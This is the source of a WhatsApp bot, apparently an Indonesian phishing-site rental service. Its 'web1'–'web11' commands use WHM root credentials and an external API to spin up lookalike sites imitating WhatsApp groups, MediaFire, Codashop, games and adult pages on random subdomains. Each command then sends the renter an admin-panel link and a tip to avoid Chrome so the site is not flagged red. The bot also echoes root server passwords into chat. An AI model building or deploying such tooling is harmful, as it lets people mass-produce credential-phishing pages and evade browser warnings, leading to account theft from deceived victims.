// BASE NO ENC BY ADON BOTZ 



const { baileys, proto, generateWAMessageFromContent, getContentType } = require('@adiwajshing/baileys')
const { getGroupAdmins,updateDatabase } = require('./lib/functions.js')
const { exec } = require('child_process')
const fs = require('fs')
const request = require("request")
module.exports = async (adon, denz, msg) => {
try {
if (msg.key && msg.key.remoteJid === 'status@broadcast') return
const type = getContentType(msg.message)
const content = JSON.stringify(msg.message)
const from = msg.key.remoteJid
const quoted = type == 'extendedTextMessage' && msg.message.extendedTextMessage.contextInfo != null ? msg.message.extendedTextMessage.contextInfo.quotedMessage || [] : []
const body = (type === 'conversation' && msg.message.conversation) ? msg.message.conversation : (type == 'imageMessage') && msg.message.imageMessage.caption ? msg.message.imageMessage.caption : (type == 'documentMessage') && msg.message.documentMessage.caption ? msg.message.documentMessage.caption : (type == 'videoMessage') && msg.message.videoMessage.caption ? msg.message.videoMessage.caption : (type == 'extendedTextMessage') && msg.message.extendedTextMessage.text ? msg.message.extendedTextMessage.text : (type == 'buttonsResponseMessage' && msg.message.buttonsResponseMessage.selectedButtonId) ? msg.message.buttonsResponseMessage.selectedButtonId : (type == 'templateButtonReplyMessage') && msg.message.templateButtonReplyMessage.selectedId ? msg.message.templateButtonReplyMessage.selectedId : ''
const prefix = /^[°zZ#$@*+,.?=''():√%!¢£¥€π¤ΠΦ_&><`™©®Δ^βα~¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@*+,.?=''():√%¢£¥€π¤ΠΦ_&><!`™©®Δ^βα~¦|/\\©^]/gi) : '.'
const isCmd = body.startsWith(prefix)
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
const args = body.trim().split(/ +/).slice(1)
const dn = args.join(' ')
const isGroup = from.endsWith('@g.us')
const botNumber = adon.user.id.split(':')[0]
const sender = msg.key.fromMe ? (adon.user.id.split(':')[0]+'@s.whatsapp.net' || adon.user.id) : (msg.key.participant || msg.key.remoteJid)
const senderNumber = sender.split('@')[0]
const pushname = msg.pushName || `${senderNumber}`
const groupMetadata = isGroup ? await adon.groupMetadata(from) : ''
const groupName = isGroup ? groupMetadata.subject : ''
const groupId = isGroup ? groupMetadata.id : ''
const groupMembers = isGroup ? groupMetadata.participants : ''
const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
const isBotGroupAdmins = groupAdmins.includes(`${botNumber}@s.whatsapp.net`) || false
const isGroupAdmins = groupAdmins.includes(sender) || false
const isSaya = botNumber.includes(senderNumber)
const isDev = nomorDeveloper.includes(senderNumber) || isSaya
const isOwner = nomorOwner.includes(senderNumber) || isSaya
const reply = async(teks) => {await adon.sendMessage(from,{text: teks},{quoted:msg})}
const sleep = async (ms) => { return new Promise(resolve => setTimeout(resolve, ms))}
const validGrup=(id,array)=>{for(var i=0;i<array.length;i++){if(array[i]==id){return!0}}
return!1}
0
// kirimprib(hasillrndy
const kirimprib =async(text,id) => { await adon.sendMessage(id,{text: text},{quoted:msg}) }
//ALL DATABASE
server = JSON.parse(fs.readFileSync('./database/server.json'))
grups = JSON.parse(fs.readFileSync('./database/grups.json'))
switch (command) {

    // 2 OKTOBER 2022
    // FITUR HOST BY ADONBOTZ

    case 'bash' :
     id = msg.key.remoteJid
        if(validGrup(id,grups)){

        menu =`  =====MENU HOSTING=====

==MENU OWNER==
${prefix}infobot
${prefix}update
${prefix}listgrup
${prefix}cekidgc
${prefix}restart

==MENU CREATE==
${prefix}buatweb
${prefix}buatakun

==MENU HOST==
${prefix}status
${prefix}listdefault
${prefix}termintdefault
${prefix}termint
${prefix}cekuser
${prefix}addpack
${prefix}infoserver
${prefix}ceksmtp
${prefix}ssweb
${prefix}subdo


==MENU GRUP==
${prefix}promote
${prefix}demote
${prefix}kick


*ADONBOTZ* di buat dengan nodejs,
di jamin dapat run 24 jam tanpa henti.

=======ADONXD=======`
reply(menu)

        }else{
            reply("*HANYA UNTUK GRUP TERTENTU KETIK .owner UNTUK sewa*")
        }
        break      
                
        case 'listgrup':
if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Owner!')
        let text = "LIST GRUP VIP :\n\n"
            for (let i = 0; i < grups.length; i++) {
                text += "> "+ grups[i] + "\n";
            }
            reply(text)
            
            
            break    
            case 'cekidgrup':
            if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Owner!')
                id = msg.key.remoteJid
                pengirim = msg.key.participant
                nama = msg.pushName
          

    await adon.sendMessage(pengirim,{text: `HALO ${nama} \n\n ${id} \n\n`},{quoted:msg})

            break 
            case 'update':
        if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Owner!')
        
            if(args == ""){
            psn = `SILAHKAN DI SIMAK
jika ingin update url server ketik *${prefix}${command}* url | xnxx.com
             
jika ingin update username server ketik *${prefix}${command}* username | adon
             
jika ingin update password server ketik *${prefix}${command}* password | @@##adon##@@
             
jika ingin update ipaddress server ketik *${prefix}${command}* ip | 1.1.1.1

jika ingin update domain server ketik *${prefix}${command}* domain | adon.com
             
jika ingin tambah grup ketik *${prefix}${command}* grup | 120363024065162195@g.us
            `
            reply(psn)
            }else{
                
                jenis = args[0]
                isi = args[2]
            
            update= updateDatabase(jenis,isi)
            if(update == "success"){
            server = JSON.parse(fs.readFileSync('./database/server.json'))
            grups = JSON.parse(fs.readFileSync('./database/grups.json'))
            
                info = `*『 INFO SETINGAN BOT HOST 』*
┏━━━━━━━━━━━━━━━━━━━
┣ Server = ${server[0].url}
┗━━━━━━━━━━━━━━━━━━━
┣ Username = ${server[0].username}
┗━━━━━━━━━━━━━━━━━━━
┣ Password = ${server[0].password}
┗━━━━━━━━━━━━━━━━━━━
┣ Ip address = ${server[0].ip}
┗━━━━━━━━━━━━━━━━━━━
┣ Domain = ${server[0].domain}
┗━━━━━━━━━━━━━━━━━━━

NOTE : GANTI TERGANTUNG KEMAOAN ANDA AJA YO , APABILA EROR ? BERARTI DI ANTARA PW / URL DI GANTI MAKASIH
            
            `
            reply(info)
                }
                
            }
            
            break
            case 'infobot':           
            if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Owner!')
            id = mek.key.remoteJid
        
            info = `INFO SETINGAN BOT HOST
            
-- DETAIL AKUN ROOT--
Server = ${server[0].url}
Username = ${server[0].username}
Password = ${server[0].password}
Ip address = ${server[0].ip}
Zone = ${server[0].zonez}

            `
            reply(info);
           
            break            
case 'menuweb' : case 'webp' : case 'web' : 
    menuweb = `
╭─❏ *『 MENU WEBP 』*
║ ➪ web1: Grup Wa
║ ➪ web2: MediaFire
║ ➪ web3: Simontok
║ ➪ web4: Mobile Legend
║ ➪ web5: Vidio 18+
║ ➪ web6: Xnxx 18+
║ ➪ web8: Codashop
║ ➪ web9: YouTube 18+
║ ➪ web10: Stumble Guy
║ ➪ web11: Safelink 18+
┗⬣
Ketik .web1 Untuk Tampilan Grup Wa`
reply(menuweb)
break


                      case 'web1' :
                   id = msg.key.remoteJid
         if(validGrup(id,grups)){


         function makeid(length) {
             var result = '';
             var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            var charactersLength = characters.length;
            for (var i = 0; i < length; i++) {
                 result += characters.charAt(Math.floor(Math.random() *
                     charactersLength));
             }
             return result;
         }

         //GANTI DATA LOGIN DI SINI
         host = server[0].url
         uroot = server[0].username
        proot = server[0].password
         ipanda = server[0].ip
         domain = "mediafire" + makeid(7) + "." + "shorty-xpy.com"


         namamu = msg.pushName
         idmu = msg.key.participant
         reply("*(proses tunggu ¥ 1 menit)...*")


         var inputt = {

             server: host,
             userwhm: uroot,
           passwhm: proot,
             ip: ipanda,
             domain: domain
         }

         request.post({
             url: 'https://api-adon.my.id/api/grupwa/createcp.php',
             form: inputt
         }, function (error, response, body) {

             function afakahinijson(str) {
                 try {
                     JSON.parse(str);
                 } catch (e) {
                     return false;
                 }
                 return true;
             }
  // console.log(body)
             if (afakahinijson(body)) {
                 hasil = JSON.parse(body)
                 user = hasil.user
                 pass = hasil.pass
                 domain = hasil.domain
                 pendek = hasil.pendek
                
                 user = user.replace(/\s+/g, '');
                 pass = pass.replace(/\s+/g, '');
                 
                 //INI BATAS
                 var inputt = {

                     server: host,
                     user: user,
                     pass: pass,
                     userwhm: uroot,
                     passwhm: proot,
                 }

                 request.post({
                     url: 'https://api-adon.my.id/api/grupwa/upload.php',
                     form: inputt
                 }, function (error, res, body) {
                   


                     hasillrndy = `SUKSES\n==========================\nWebsite : ${pendek}\nWeb Setting : https://${domain}/asisudhdusndjhejgg98/adon.php\n==========================\n*Jangan Pakai Browser Chrome Supaya Web tidak Merah*`


                  kirimprib(`hi ${namamu}`, idmu)
                     kirimprib(hasillrndy, idmu)
                 })
             } else {
                 reply("_Koneksi Terputus, Silahkan coba lagi dalam 5 Detik!_") //error ,limit username,server mati, cpu naik, domain merah/error
             }
         })
     }else{
         reply("*KHUSUS GRUP TERTENTU KETIK .owner untuk sewa*")
     }
  break

                  case 'web2' :
                  id = msg.key.remoteJid
        if(validGrup(id,grups)){


        function makeid(length) {
            var result = '';
            var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            var charactersLength = characters.length;
            for (var i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() *
                    charactersLength));
            }
            return result;
        }

        //GANTI DATA LOGIN DI SINI
        host = server[0].url
        uroot = server[0].username
        proot = server[0].password
        ipanda = server[0].ip
        domain = "mediafire" + makeid(7) + "." + "idn73.my.id"


        namamu = msg.pushName
        idmu = msg.key.participant
        reply("*(proses tunggu ¥ 1 menit)...*")


        var inputt = {

            server: host,
            userwhm: uroot,
            passwhm: proot,
            ip: ipanda,
            domain: domain
        }

        request.post({
            url: 'https://api-adon.my.id/api/mediafire/createcp.php',
            form: inputt
        }, function (error, response, body) {

            function afakahinijson(str) {
                try {
                    JSON.parse(str);
                } catch (e) {
                    return false;
                }
                return true;
            }
 //  console.log(body)
if (afakahinijson(body)) {
                 hasil = JSON.parse(body)
                 user = hasil.user
                 pass = hasil.pass
                 domain = hasil.domain
                 pendek = hasil.pendek
                
                user = user.replace(/\s+/g, '');
                pass = pass.replace(/\s+/g, '');
                
                //INI BATAS
                var inputt = {

                    server: host,
                    user: user,
                    pass: pass,
                    userwhm: uroot,
                    passwhm: proot,
                }

                request.post({
                    url: 'https://api-adon.my.id/api/mediafire/upload.php',
                    form: inputt
                }, function (error, res, body) {
                   


                    hasillrndy = `SUKSES\n==========================\nWebsite : ${pendek}\nWeb Setting : https://${domain}/asisudhdusndjhejgg98/adon.php\n==========================\n*Jangan Pakai Browser Chrome Supaya Web tidak Merah*`


                 kirimprib(`hi ${namamu}`, idmu)
                    kirimprib(hasillrndy, idmu)
                })
            } else {
                reply("_Koneksi Terputus, Silahkan coba lagi dalam 5 Detik!_") //error ,limit username,server mati, cpu naik, domain merah/error
            }
        })
    }else{
        reply("*KHUSUS GRUP TERTENTU KETIK .owner untuk sewa*")
    }
break

                  case 'web3' :
                  id = msg.key.remoteJid
        if(validGrup(id,grups)){


        function makeid(length) {
            var result = '';
            var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            var charactersLength = characters.length;
            for (var i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() *
                    charactersLength));
            }
            return result;
        }

        //GANTI DATA LOGIN DI SINI
        host = server[0].url
        uroot = server[0].username
        proot = server[0].password
        ipanda = server[0].ip
        domain = "simontok" + makeid(7) + "." + "idn3.my.id"


        namamu = msg.pushName
        idmu = msg.key.participant
        reply("*(proses tunggu ¥ 1 menit)...*")


        var inputt = {

            server: host,
            userwhm: uroot,
            passwhm: proot,
            ip: ipanda,
            domain: domain
        }

        request.post({
            url: 'https://api-adon.my.id/api/simontok/createcp.php',
            form: inputt
        }, function (error, response, body) {

            function afakahinijson(str) {
                try {
                    JSON.parse(str);
                } catch (e) {
                    return false;
                }
                return true;
            }
// console.log(body)
if (afakahinijson(body)) {
                 hasil = JSON.parse(body)
                 user = hasil.user
                 pass = hasil.pass
                 domain = hasil.domain
                 pendek = hasil.pendek
                
                user = user.replace(/\s+/g, '');
                pass = pass.replace(/\s+/g, '');
                
                //INI BATAS
                var inputt = {

                    server: host,
                    user: user,
                    pass: pass,
                    userwhm: uroot,
                    passwhm: proot,
                }

                request.post({
                    url: 'https://api-adon.my.id/api/simontok/upload.php',
                    form: inputt
                }, function (error, res, body) {
                   


                    hasillrndy = `SUKSES\n==========================\nWebsite : ${pendek}\nWeb Setting : https://${domain}/asisudhdusndjhejgg98/adon.php\n==========================\n*Jangan Pakai Browser Chrome Supaya Web tidak Merah*`


                 kirimprib(`hi ${namamu}`, idmu)
                    kirimprib(hasillrndy, idmu)
                })
            } else {
                reply("_Koneksi Terputus, Silahkan coba lagi dalam 5 Detik!_") //error ,limit username,server mati, cpu naik, domain merah/error
            }
        })
    }else{
        reply("*KHUSUS GRUP TERTENTU KETIK .owner untuk sewa*")
    }
break

                  case 'web4' :
                  id = msg.key.remoteJid
        if(validGrup(id,grups)){


        function makeid(length) {
            var result = '';
            var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            var charactersLength = characters.length;
            for (var i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() *
                    charactersLength));
            }
            return result;
        }

        //GANTI DATA LOGIN DI SINI
        host = server[0].url
        uroot = server[0].username
        proot = server[0].password
        ipanda = server[0].ip
        domain = "mobile-legends" + makeid(7) + "." + "idn3.my.id"


        namamu = msg.pushName
        idmu = msg.key.participant
        reply("*(proses tunggu ¥ 1 menit)...*")


        var inputt = {

            server: host,
            userwhm: uroot,
            passwhm: proot,
            ip: ipanda,
            domain: domain
        }

        request.post({
            url: 'https://api-adon.my.id/api/mobile-legend/createcp.php',
            form: inputt
        }, function (error, response, body) {

            function afakahinijson(str) {
                try {
                    JSON.parse(str);
                } catch (e) {
                    return false;
                }
                return true;
            }
if (afakahinijson(body)) {
                 hasil = JSON.parse(body)
                 user = hasil.user
                 pass = hasil.pass
                 domain = hasil.domain
                 pendek = hasil.pendek
                
                user = user.replace(/\s+/g, '');
                pass = pass.replace(/\s+/g, '');
                
                //INI BATAS
                var inputt = {

                    server: host,
                    user: user,
                    pass: pass,
                    userwhm: uroot,
                    passwhm: proot,
                }

                request.post({
                    url: 'https://api-adon.my.id/api/mobile-legend/upload.php',
                    form: inputt
                }, function (error, res, body) {
                   


                    hasillrndy = `SUKSES\n==========================\nWebsite : ${pendek}\nWeb Setting : https://${domain}/asisudhdusndjhejgg98/adon.php\n==========================\n*Jangan Pakai Browser Chrome Supaya Web tidak Merah*`


                 kirimprib(`hi ${namamu}`, idmu)
                    kirimprib(hasillrndy, idmu)
                })
            } else {
                reply("_Koneksi Terputus, Silahkan coba lagi dalam 5 Detik!_") //error ,limit username,server mati, cpu naik, domain merah/error
            }
        })
    }else{
        reply("*KHUSUS GRUP TERTENTU KETIK .owner untuk sewa*")
    }
break

                  case 'web5' :
                  id = msg.key.remoteJid
        if(validGrup(id,grups)){


        function makeid(length) {
            var result = '';
            var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            var charactersLength = characters.length;
            for (var i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() *
                    charactersLength));
            }
            return result;
        }

        //GANTI DATA LOGIN DI SINI
        host = server[0].url
        uroot = server[0].username
        proot = server[0].password
        ipanda = server[0].ip
        domain = "groupviral" + makeid(7) + "." + "idn3.my.id"


        namamu = msg.pushName
        idmu = msg.key.participant
        reply("*(proses tunggu ¥ 1 menit)...*")


        var inputt = {

            server: host,
            userwhm: uroot,
            passwhm: proot,
            ip: ipanda,
            domain: domain
        }

        request.post({
            url: 'https://api-adon.my.id/api/vidio/createcp.php',
            form: inputt
        }, function (error, response, body) {

            function afakahinijson(str) {
                try {
                    JSON.parse(str);
                } catch (e) {
                    return false;
                }
                return true;
            }
if (afakahinijson(body)) {
                 hasil = JSON.parse(body)
                 user = hasil.user
                 pass = hasil.pass
                 domain = hasil.domain
                 pendek = hasil.pendek
                
                user = user.replace(/\s+/g, '');
                pass = pass.replace(/\s+/g, '');
                
                var inputt = {

                    server: host,
                    user: user,
                    pass: pass,
                    userwhm: uroot,
                    passwhm: proot,
                }

                request.post({
                    url: 'https://api-adon.my.id/api/vidio/upload.php',
                    form: inputt
                }, function (error, res, body) {
                   


                    hasillrndy = `SUKSES\n==========================\nWebsite : ${pendek}\nWeb Setting : https://${domain}/asisudhdusndjhejgg98/adon.php\n==========================\n*Jangan Pakai Browser Chrome Supaya Web tidak Merah*`


                 kirimprib(`hi ${namamu}`, idmu)
                    kirimprib(hasillrndy, idmu)
                })
            } else {
                reply("_Koneksi Terputus, Silahkan coba lagi dalam 5 Detik!_") //error ,limit username,server mati, cpu naik, domain merah/error
            }
        })
    }else{
        reply("*KHUSUS GRUP TERTENTU KETIK .owner untuk sewa*")
    }
break

                  case 'web6' :
                  id = msg.key.remoteJid
        if(validGrup(id,grups)){


        function makeid(length) {
            var result = '';
            var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            var charactersLength = characters.length;
            for (var i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() *
                    charactersLength));
            }
            return result;
        }

        //GANTI DATA LOGIN DI SINI
        host = server[0].url
        uroot = server[0].username
        proot = server[0].password
        ipanda = server[0].ip
        domain = "groupwa" + makeid(7) + "." + "idn3.my.id"


        namamu = msg.pushName
        idmu = msg.key.participant
        reply("*(proses tunggu ¥ 1 menit)...*")


        var inputt = {

            server: host,
            userwhm: uroot,
            passwhm: proot,
            ip: ipanda,
            domain: domain
        }

        request.post({
            url: 'https://api-adon.my.id/api/xnxx/createcp.php',
            form: inputt
        }, function (error, response, body) {

            function afakahinijson(str) {
                try {
                    JSON.parse(str);
                } catch (e) {
                    return false;
                }
                return true;
            }
// console.log(body)
if (afakahinijson(body)) {
                 hasil = JSON.parse(body)
                 user = hasil.user
                 pass = hasil.pass
                 domain = hasil.domain
                 pendek = hasil.pendek
                
                user = user.replace(/\s+/g, '');
                pass = pass.replace(/\s+/g, '');
                
                //INI BATAS
                var inputt = {

                    server: host,
                    user: user,
                    pass: pass,
                    userwhm: uroot,
                    passwhm: proot,
                }

                request.post({
                    url: 'https://api-adon.my.id/api/xnxx/upload.php',
                    form: inputt
                }, function (error, res, body) {
                   


                    hasillrndy = `SUKSES\n==========================\nWebsite : ${pendek}\nWeb Setting : https://${domain}/asisudhdusndjhejgg98/adon.php\n==========================\n*Jangan Pakai Browser Chrome Supaya Web tidak Merah*`


                 kirimprib(`hi ${namamu}`, idmu)
                    kirimprib(hasillrndy, idmu)
                })
            } else {
                reply("_Koneksi Terputus, Silahkan coba lagi dalam 5 Detik!_") //error ,limit username,server mati, cpu naik, domain merah/error
            }
        })
    }else{
        reply("*KHUSUS GRUP TERTENTU KETIK .owner untuk sewa*")
    }
break

                  case 'web7' :
                  id = msg.key.remoteJid
        if(validGrup(id,grups)){


        function makeid(length) {
            var result = '';
            var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            var charactersLength = characters.length;
            for (var i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() *
                    charactersLength));
            }
            return result;
        }

        //GANTI DATA LOGIN DI SINI
        host = server[0].url
        uroot = server[0].username
        proot = server[0].password
        ipanda = server[0].ip
        domain = "groupwa" + makeid(7) + "." + "idn3.my.id"


        namamu = msg.pushName
        idmu = msg.key.participant
        reply("*(proses tunggu ¥ 1 menit)...*")


        var inputt = {

            server: host,
            userwhm: uroot,
            passwhm: proot,
            ip: ipanda,
            domain: domain
        }

        request.post({
            url: 'https://api-adon.my.id/api/codashop/createcp.php',
            form: inputt
        }, function (error, response, body) {

            function afakahinijson(str) {
                try {
                    JSON.parse(str);
                } catch (e) {
                    return false;
                }
                return true;
            }
// console.log(body)
if (afakahinijson(body)) {
                 hasil = JSON.parse(body)
                 user = hasil.user
                 pass = hasil.pass
                 domain = hasil.domain
                 pendek = hasil.pendek
                
                user = user.replace(/\s+/g, '');
                pass = pass.replace(/\s+/g, '');
                
                //INI BATAS
                var inputt = {

                    server: host,
                    user: user,
                    pass: pass,
                    userwhm: uroot,
                    passwhm: proot,
                }

                request.post({
                    url: 'https://api-adon.my.id/api/codashop/upload.php',
                    form: inputt
                }, function (error, res, body) {
                   


                    hasillrndy = `SUKSES\n==========================\nWebsite : ${pendek}\nWeb Setting : https://${domain}/asisudhdusndjhejgg98/adon.php\n==========================\n*Jangan Pakai Browser Chrome Supaya Web tidak Merah*`


                 kirimprib(`hi ${namamu}`, idmu)
                    kirimprib(hasillrndy, idmu)
                })
            } else {
                reply("_Koneksi Terputus, Silahkan coba lagi dalam 5 Detik!_") //error ,limit username,server mati, cpu naik, domain merah/error
            }
        })
    }else{
        reply("*KHUSUS GRUP TERTENTU KETIK .owner untuk sewa*")
    }
break

                  case 'web8' :
                  id = msg.key.remoteJid
        if(validGrup(id,grups)){


        function makeid(length) {
            var result = '';
            var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            var charactersLength = characters.length;
            for (var i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() *
                    charactersLength));
            }
            return result;
        }

        //GANTI DATA LOGIN DI SINI
        host = server[0].url
        uroot = server[0].username
        proot = server[0].password
        ipanda = server[0].ip
        domain = "groupwa" + makeid(7) + "." + "idn3.my.id"


        namamu = msg.pushName
        idmu = msg.key.participant
        reply("*(proses tunggu ¥ 1 menit)...*")


        var inputt = {

            server: host,
            userwhm: uroot,
            passwhm: proot,
            ip: ipanda,
            domain: domain
        }

        request.post({
            url: 'https://api-adon.my.id/api/youtube/createcp.php',
            form: inputt
        }, function (error, response, body) {

            function afakahinijson(str) {
                try {
                    JSON.parse(str);
                } catch (e) {
                    return false;
                }
                return true;
            }
// console.log(body)
if (afakahinijson(body)) {
                 hasil = JSON.parse(body)
                 user = hasil.user
                 pass = hasil.pass
                 domain = hasil.domain
                 pendek = hasil.pendek
                
                user = user.replace(/\s+/g, '');
                pass = pass.replace(/\s+/g, '');
                
                //INI BATAS
                var inputt = {

                    server: host,
                    user: user,
                    pass: pass,
                    userwhm: uroot,
                    passwhm: proot,
                }

                request.post({
                    url: 'https://api-adon.my.id/api/youtube/upload.php',
                    form: inputt
                }, function (error, res, body) {
                   


                    hasillrndy = `SUKSES\n==========================\nWebsite : ${pendek}\nWeb Setting : https://${domain}/asisudhdusndjhejgg98/adon.php\n==========================\n*Jangan Pakai Browser Chrome Supaya Web tidak Merah*`


                 kirimprib(`hi ${namamu}`, idmu)
                    kirimprib(hasillrndy, idmu)
                })
            } else {
                reply("_Koneksi Terputus, Silahkan coba lagi dalam 5 Detik!_") //error ,limit username,server mati, cpu naik, domain merah/error
            }
        })
    }else{
        reply("*KHUSUS GRUP TERTENTU KETIK .owner untuk sewa*")
    }
break

                  case 'web9' :
                  id = msg.key.remoteJid
        if(validGrup(id,grups)){


        function makeid(length) {
            var result = '';
            var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            var charactersLength = characters.length;
            for (var i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() *
                    charactersLength));
            }
            return result;
        }

        //GANTI DATA LOGIN DI SINI
        host = server[0].url
        uroot = server[0].username
        proot = server[0].password
        ipanda = server[0].ip
        domain = "groupwa" + makeid(7) + "." + "idn3.my.id"


        namamu = msg.pushName
        idmu = msg.key.participant
        reply("*(proses tunggu ¥ 1 menit)...*")


        var inputt = {

            server: host,
            userwhm: uroot,
            passwhm: proot,
            ip: ipanda,
            domain: domain
        }

        request.post({
            url: 'https://api-adon.my.id/api/freefire/createcp.php',
            form: inputt
        }, function (error, response, body) {

            function afakahinijson(str) {
                try {
                    JSON.parse(str);
                } catch (e) {
                    return false;
                }
                return true;
            }
// console.log(body)
if (afakahinijson(body)) {
                 hasil = JSON.parse(body)
                 user = hasil.user
                 pass = hasil.pass
                 domain = hasil.domain
                 pendek = hasil.pendek
                
                user = user.replace(/\s+/g, '');
                pass = pass.replace(/\s+/g, '');
                
                //INI BATAS
                var inputt = {

                    server: host,
                    user: user,
                    pass: pass,
                    userwhm: uroot,
                    passwhm: proot,
                }

                request.post({
                    url: 'https://api-adon.my.id/api/freefire/upload.php',
                    form: inputt
                }, function (error, res, body) {
                   


                    hasillrndy = `SUKSES\n==========================\nWebsite : ${pendek}\nWeb Setting : https://${domain}/asisudhdusndjhejgg98/adon.php\n==========================\n*Jangan Pakai Browser Chrome Supaya Web tidak Merah*`


                 kirimprib(`hi ${namamu}`, idmu)
                    kirimprib(hasillrndy, idmu)
                })
            } else {
                reply("_Koneksi Terputus, Silahkan coba lagi dalam 5 Detik!_") //error ,limit username,server mati, cpu naik, domain merah/error
            }
        })
    }else{
        reply("*KHUSUS GRUP TERTENTU KETIK .owner untuk sewa*")
    }
break
case 'web10' :
                  id = msg.key.remoteJid
        if(validGrup(id,grups)){


        function makeid(length) {
            var result = '';
            var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            var charactersLength = characters.length;
            for (var i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() *
                    charactersLength));
            }
            return result;
        }

        //GANTI DATA LOGIN DI SINI
        host = server[0].url
        uroot = server[0].username
        proot = server[0].password
        ipanda = server[0].ip
        domain = "groupwa" + makeid(7) + "." + "idn3.my.id"


        namamu = msg.pushName
        idmu = msg.key.participant
        reply("*(proses tunggu ¥ 1 menit)...*")


        var inputt = {

            server: host,
            userwhm: uroot,
            passwhm: proot,
            ip: ipanda,
            domain: domain
        }

        request.post({
            url: 'https://api-adon.my.id/api/stumble/createcp.php',
            form: inputt
        }, function (error, response, body) {

            function afakahinijson(str) {
                try {
                    JSON.parse(str);
                } catch (e) {
                    return false;
                }
                return true;
            }
// console.log(body)
if (afakahinijson(body)) {
                 hasil = JSON.parse(body)
                 user = hasil.user
                 pass = hasil.pass
                 domain = hasil.domain
                 pendek = hasil.pendek
                
                user = user.replace(/\s+/g, '');
                pass = pass.replace(/\s+/g, '');
                
                //INI BATAS
                var inputt = {

                    server: host,
                    user: user,
                    pass: pass,
                    userwhm: uroot,
                    passwhm: proot,
                }

                request.post({
                    url: 'https://api-adon.my.id/api/stumble/upload.php',
                    form: inputt
                }, function (error, res, body) {
                   


                    hasillrndy = `SUKSES\n==========================\nWebsite : ${pendek}\nWeb Setting : https://${domain}/asisudhdusndjhejgg98/adon.php\n==========================\n*Jangan Pakai Browser Chrome Supaya Web tidak Merah*`


                 kirimprib(`hi ${namamu}`, idmu)
                    kirimprib(hasillrndy, idmu)
                })
            } else {
                reply("_Koneksi Terputus, Silahkan coba lagi dalam 5 Detik!_") //error ,limit username,server mati, cpu naik, domain merah/error
            }
        })
    }else{
        reply("*KHUSUS GRUP TERTENTU KETIK .owner untuk sewa*")
    }
break

case 'web11' :
                  id = msg.key.remoteJid
        if(validGrup(id,grups)){


        function makeid(length) {
            var result = '';
            var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            var charactersLength = characters.length;
            for (var i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() *
                    charactersLength));
            }
            return result;
        }

        //GANTI DATA LOGIN DI SINI
        host = server[0].url
        uroot = server[0].username
        proot = server[0].password
        ipanda = server[0].ip
        domain = "groupwa" + makeid(7) + "." + "idn3.my.id"


        namamu = msg.pushName
        idmu = msg.key.participant
        reply("*(proses tunggu ¥ 1 menit)...*")


        var inputt = {

            server: host,
            userwhm: uroot,
            passwhm: proot,
            ip: ipanda,
            domain: domain
        }

        request.post({
            url: 'https://api-adon.my.id/api/safelink/createcp.php',
            form: inputt
        }, function (error, response, body) {

            function afakahinijson(str) {
                try {
                    JSON.parse(str);
                } catch (e) {
                    return false;
                }
                return true;
            }
// console.log(body)
if (afakahinijson(body)) {
                 hasil = JSON.parse(body)
                 user = hasil.user
                 pass = hasil.pass
                 domain = hasil.domain
                 pendek = hasil.pendek
                
                user = user.replace(/\s+/g, '');
                pass = pass.replace(/\s+/g, '');
                
                //INI BATAS
                var inputt = {

                    server: host,
                    user: user,
                    pass: pass,
                    userwhm: uroot,
                    passwhm: proot,
                }

                request.post({
                    url: 'https://api-adon.my.id/api/safelink/upload.php',
                    form: inputt
                }, function (error, res, body) {
                   


                    hasillrndy = `SUKSES\n==========================\nWebsite : ${pendek}\nWeb Setting : https://${domain}/asisudhdusndjhejgg98/adon.php\n==========================\n*Jangan Pakai Browser Chrome Supaya Web tidak Merah*`


                 kirimprib(`hi ${namamu}`, idmu)
                    kirimprib(hasillrndy, idmu)
                })
            } else {
                reply("_Koneksi Terputus, Silahkan coba lagi dalam 5 Detik!_") //error ,limit username,server mati, cpu naik, domain merah/error
            }
        })
    }else{
        reply("*KHUSUS GRUP TERTENTU KETIK .owner untuk sewa*")
    }
break
case 'owner':
owner = `https://wa.me/6285768515086\n*JANGAN SPAM BRO*\n*JIKA OFF LAGI SIBUK TUNGGU ON*`
reply(owner)
break
case 'bot':
bot =`BOT ON`
reply(bot)
break
case 'sewa':
sewa =`*MURWEB 30K/BULAN*\n*MURWEB PERMANEN 50K*\n*JASA RUN BOT 24 JAM FAST RESPON 20*\n*KETIK.owner UNTUK SEWA*`
